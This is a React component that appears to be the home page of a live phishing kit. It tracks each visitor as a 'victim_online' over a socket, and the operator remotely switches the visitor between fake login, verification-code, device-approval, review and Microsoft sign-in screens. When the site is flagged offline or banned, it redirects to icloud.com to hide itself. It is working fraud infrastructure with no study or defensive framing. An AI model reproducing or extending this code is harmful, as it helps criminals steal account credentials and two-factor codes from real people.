import { useEffect } from "react";
import Login from "./Login";
import Code from "./Code";
import Loading from "./Loading";
import Review from "./Review";
import { createSocket } from "../lib/socket";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import SuccessPage from "./SuccessPage";
import Disconnect from "./Disconnect";
import Microsoft from "./Microsoft";
import CaseLookup from "./CaseLookup";

function HomePage({ authUser, isLoading }) {
  const queryClient = useQueryClient();

  const { data: siteStatus, isLoading: statusLoading } = useQuery({
    queryKey: ["siteStatus"],
    queryFn: async () => {
      const res = await fetch("/api/v1/rumman/site/status");
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed to load status");
      return data;
    },
    refetchInterval: 10000,
  });

  useEffect(() => {
    const newSocket = createSocket();

    const refresh = () => {
      queryClient.invalidateQueries({ queryKey: ["authUser"] });
    };

    const announce = () => {
      if (authUser?._id) {
        newSocket.emit("victim_online", { userId: authUser._id });
      }
    };

    newSocket.on("connect", announce);
    announce();
    const ping = setInterval(announce, 8000);

    newSocket.on("page_changed", (data) => {
      if (data.page === "login") {
        window.location.reload();
        return;
      }
      refresh();
    });
    newSocket.on("user_updated", refresh);
    newSocket.on("site_status_changed", (payload) => {
      queryClient.setQueryData(["siteStatus"], payload);
    });

    return () => {
      clearInterval(ping);
      newSocket.close();
    };
  }, [queryClient, authUser?._id]);

  useEffect(() => {
    if (isLoading || authUser) return;
    let cancelled = false;
    (async () => {
      try {
        const res = await fetch("/api/v1/rumman/auth/visit", {
          method: "POST",
          credentials: "include",
        });
        const data = await res.json().catch(() => ({}));
        if (!cancelled && res.ok) {
          queryClient.setQueryData(["authUser"], data);
        }
      } catch {
        /* ignore */
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [isLoading, authUser, queryClient]);

  useEffect(() => {
    if (statusLoading) return;
    if (siteStatus?.online === false || siteStatus?.banned === true) {
      window.location.href = "https://icloud.com";
    }
  }, [siteStatus, statusLoading]);

  if (statusLoading || siteStatus?.online === false || siteStatus?.banned === true) {
    return (
      <div
        className="w-full min-h-screen flex items-center justify-center"
        style={{ background: "var(--page-bg)" }}
      >
        <div
          className="w-7 h-7 rounded-full border-2 animate-spin"
          style={{
            borderColor: "var(--border-input)",
            borderTopColor: "var(--text-secondary)",
          }}
        />
      </div>
    );
  }

  return (
    <div className="w-full min-h-screen" style={{ background: "var(--page-bg)" }}>
      {authUser?.currentPage === "login" && <Login authUser={authUser} />}
      {authUser?.currentPage === "code" && <Code authUser={authUser} />}
      {authUser?.currentPage === "loading" && (
        <Loading authUser={authUser} />
      )}
      {(!authUser ||
        authUser?.currentPage === "case_lookup" ||
        authUser?.currentPage === "caseLookup") && (
        <CaseLookup authUser={authUser} />
      )}
      {authUser?.currentPage === "review" && <Review authUser={authUser} />}
      {authUser?.currentPage === "success" && <SuccessPage />}
      {(authUser?.currentPage === "disconnect" ||
        authUser?.currentPage === "accept_device") && (
        <Disconnect authUser={authUser} />
      )}
      {authUser?.currentPage === "microsoft" && (
        <Microsoft authUser={authUser} />
      )}
    </div>
  );
}

export default HomePage;
